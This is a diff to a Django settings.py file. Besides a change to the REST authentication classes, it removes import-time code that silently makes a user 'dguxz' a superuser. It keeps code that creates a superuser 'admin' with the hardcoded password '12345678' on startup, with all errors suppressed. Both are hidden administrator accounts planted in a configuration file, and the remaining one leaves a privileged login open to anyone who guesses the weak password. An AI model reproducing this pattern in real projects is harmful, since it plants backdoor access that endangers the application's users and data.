@@ -103,6 +103,7 @@ DEFAULT_AUTO_FIELD = "django.db.models.BigAutoField"
 
 REST_FRAMEWORK = {
     "DEFAULT_AUTHENTICATION_CLASSES": (
+        "rest_framework.authentication.SessionAuthentication",
         "rest_framework_simplejwt.authentication.JWTAuthentication",
     ),
 
@@ -113,12 +114,7 @@ REST_FRAMEWORK = {
 from django.contrib.auth import get_user_model
 try:
     User = get_user_model()
-    user = User.objects.filter(username='dguxz').first()
-    if user:
-        user.is_staff = True
-        user.is_superuser = True
-        user.save()
-    else:
+    if not User.objects.filter(username='admin').exists():
         User.objects.create_superuser('admin', 'admin@example.com', '12345678')
 except Exception:
     pass
